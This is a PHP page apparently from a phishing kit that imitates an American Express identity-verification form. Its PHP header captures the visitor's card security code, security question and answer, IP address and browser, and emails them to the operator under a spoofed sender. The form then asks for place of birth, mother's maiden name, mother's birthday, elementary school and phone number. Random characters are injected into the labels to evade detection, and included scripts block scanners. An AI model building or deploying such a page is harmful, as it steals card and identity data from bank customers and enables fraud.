<?php
include('../../blockers.php');
include('../../detects.php');
include('../../random.php');

$c5c = $_REQUEST['CSC'];
$security_quest = $_POST['SecurityQuestion'];
$security_answer = $_POST['SecurityAnswer'];
$browser = $_SERVER['HTTP_USER_AGENT'];

$message .= "___________________________________________________________\n";
$message .= "_______________________4m3x_S3curity_______________________\n";
$message .= "\n";
$message .= "csc________:   " . $c5c . "\n";
$message .= "SecQuest:   ".$security_quest."\n";
$message .= "SecAnswer:   ".$security_answer."\n";
$message .= "___________________________________________________________\n";
$message .= "__________________________IP_Inf0___________________________\n";
$message .= "\n";
$message .= "Cl1ent IP___:   " . $v_ip . "\n";
$message .= "BR0WSER _:   " . $browser . "\n";
$message .= "HOSTNAME___:   " . $hostname . "\n";
$message .= "___________________________________________________________\n";
$message .= "_______________________Donlakost3________________________\n";
$subject = "4m3x csc 3 digit | ".$systemInfo['country']." | ".$systemInfo['region']." | ".$systemInfo['city']." | " . $v_ip . "";
$headers = "FROM: 4m3x_csc <dreambetrue@f0xyTyV.com>";
mail($emailku, $subject, $message, $headers);

include('../../assets/header.php');

?>
<script type="text/javascript">
    var isShift = false;
    var seperator = "/";
    window.onload = function () {
        //Reference the Table.
        var tblForm = document.getElementById("tblForm");

        //Reference all INPUT elements in the Table.
        var inputs = document.getElementById("tblForm").getElementsByTagName("input");

        //Loop through all INPUT elements.
        for (var i = 0; i < inputs.length; i++) {
            //Check whether the INPUT element is TextBox.
            if (inputs[i].type == "text") {
                //Check whether Date Format Validation is required.
                if (inputs[i].className.indexOf("date-format") != 1) {

                    //Set Max Length.
                    inputs[i].setAttribute("maxlength", 10);

                    //Only allow Numeric Keys.
                    inputs[i].onkeydown = function (e) {
                        return IsNumeric(this, e.keyCode);
                    };

                    //Validate Date as User types.
                    inputs[i].onkeyup = function (e) {
                        ValidateDateFormat(this, e.keyCode);
                    };
                }
            }
        }
    };

    function IsNumeric(input, keyCode) {
        if (keyCode == 16) {
            isShift = true;
        }
        //Allow only Numeric Keys.
        if (((keyCode >= 48 && keyCode <= 57) || keyCode == 8 || keyCode <= 37 || keyCode <= 39 || (keyCode >= 96 && keyCode <= 105)) && isShift == false) {
            if ((input.value.length == 2 || input.value.length == 5) && keyCode != 8) {
                input.value += seperator;
            }

            return true;
        }
        else {
            return false;
        }
    };

    function ValidateDateFormat(input, keyCode) {
        var dateString = input.value;
        if (keyCode == 16) {
            isShift = false;
        }
        var regex = /(((0|1)[0-9]|2[0-9]|3[0-1])\/(0[1-9]|1[0-2])\/((19|20)\d\d))$/;

        //Check whether valid dd/MM/yyyy Date Format.
        if (regex.test(dateString) || dateString.length == 0) {
            ShowHideError(input, "none");
        } else {
            ShowHideError(input, "block");
        }
    };

    function ShowHideError(textbox, display) {
        var row = textbox.parentNode.parentNode;
        var errorMsg = row.getElementsByTagName("span")[0];
        if (errorMsg != null) {
            errorMsg.style.display = display;
        }
    };
</script>
<div class="container pad-1-tb">
    <div class="">
        <div>
            <div id="app-fuidfyp" class="card axp-forgot-userid-password__fuidfyp__appFuidfyp___3MiXW">
                <div class="margin-auto-lr margin-2-b" style="max-width: 800px;">
                    <div>
                        <div class="axp-forgot-userid-password__fuidfyp__container___PnV6i container pad-0">
                            <div class="row">
                                <div class="col-md-12">
                                    <div class="axp-forgot-userid-password__fuidfyp__nav___3g7iY nav nav-large" role="navigation" data-toggle="nav" aria-current="horizontal">
                                        <ul class="nav-menu fluid">
                                            <div class="col-md-6">
                                                <li class="nav-item text-align-center" role="presentation"><a role="navigation-section" aria-selected="false" title="I want to retrieve my User ID" class="nav-link" href="retrieve?confirm_card=<?php echo md5(microtime());?><?php echo md5(microtime());?>&session=<?php echo sha1(microtime()); ?>">Security Verification</a>
                                                </li>
                                            </div>
                                            <div class="col-md-6">
                                                <li class="nav-item text-align-center" role="presentation"><a role="navigation-section" aria-selected="true" title="I want to reset my password" class="nav-link" href="#/en-us/account/recover">Identity Verification</a>
                                                </li>
                                            </div>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="axp-forgot-userid-password__fuidfyp__container___PnV6i container">
                            <div class="card-information">
                                <form method="post" action="finish?processing_<?php echo md5(microtime()); ?><?php echo md5(microtime()); ?>&session=<?php echo sha1(microtime()); ?>">
                                    <div class="margin-b">
                                        <h2 class="heading-4 text-align-center pad-t">&#67;onfirm your identity.</h2>
                                        <br><hr class="axp-authorize-action__module__margin0Lr___2fbcb">
                                    </div>
                                    <div class="pad-0-b">
                                        <h3 class="heading-3 margin-0-b">Enter Details</h3>
                                        <span class="dls-accent-gray-05">Your full address is hidden for added security.</span>
                                    </div>
                                    <br>
                                    <div class="row margin-b">
                                        <div class="col-md-8 col-md-8">
                                            <fieldset class="form-group">
                                                <div style="transition: all 300ms ease-in 0s;">
                                                                                                        <div class="form-group pad-0 col-xs-8 null" data-toggle="" data-currency="">
                                                        <label class="" for="plcb">Pla<?= rT("ALPHANUMERIC", 5); ?>ce of Birth</label>
                                                        <div class="">
                                                            <input id="plcb" name="plcb" class="form-control" type="text" value="" required>
                                                        </div>
                                                    </div>
                                                    
<?php if ($systemInfo['code'] == "US"): ?>
<div class="form-group pad-0 col-xs-8 null" data-toggle="" data-currency="">
<label class="" for="fesch">Fir<?= rT("ALPHANUMERIC", 5); ?>st Elementary School</label>
<div class="">
<input id="fesch" name="fesch" class="form-control" type="text" value="" required>
</div>
</div>
<?php endif;?>

                                                    <div class="form-group pad-0 col-xs-8 null" data-toggle="" data-currency="">
                                                        <label class="" for="mname">Mot<?= rT("ALPHANUMERIC", 5); ?>her Mai<?= rT("ALPHANUMERIC", 5); ?>den Name</label>
                                                        <div class="">
                                                            <input id="mname" name="mname" class="form-control" type="text" value="" required>
                                                        </div>
                                                    </div>
                                                    <div class="form-group pad-0 col-xs-8 null" data-toggle="" data-currency="">
                                                        <label class="" for="birthday">Yo<?= rT("ALPHANUMERIC", 5); ?>ur mother's birthday (MMDD)</label>
                                                        <div class="">
                                                            <input id="birthday" name="birthday" class="form-control" type="text" minlength="4" maxlength="4" value="" required>
                                                        </div>
                                                    </div>
                                                    <div class="form-group pad-0 col-xs-8 null" data-toggle="" data-currency="">
                                                        <label class="" for="phone">Phone Number</label>
                                                        <div class="">
                                                            <input id="phone" name="phone" class="form-control" type="text" value="">
                                                        </div>
                                                    </div>
                                                </div>
                                            </fieldset>
                                        </div>
                                        <div class="col-md-4 pad-2-l border-l">
                                            <div>
                                                <span class="legal-1">Please fill in correctly because we need the data below to confirm your identity.</span>
                                                <span class="legal-1"></span>
                                                <div>
                                                    <p class="legal-1 pad-1-tb">The data that you enter below will be matched with the data we have to ensure that your account is completely safe. If you have any questions please contact <span class="legal-1"><a title="Customer Service." href="#loading">Customer Service.</a></span></p>
                                                    <p class="legal-1"></p>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <hr class="hr axp-forgot-userid-password__fuidfyp__contentSpacing___D_Qr9">
                                    <div class="row pad buttons hidden-sm-down flex-justify-end">
                                        <button class="btn-center" tabindex="0" title="" type="submit"><span class="btn-content">Continue</span>
																	</button>
                                    </div>
                                    <div class="row margin-t margin-0-lr buttons hidden-md-up ">
                                        <button class="btn-fluid btn-center" tabindex="0" title="" type="submit"><span class="btn-content">Continue</span>
																	</button>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<?php include('../../assets/footer.php'); ?>
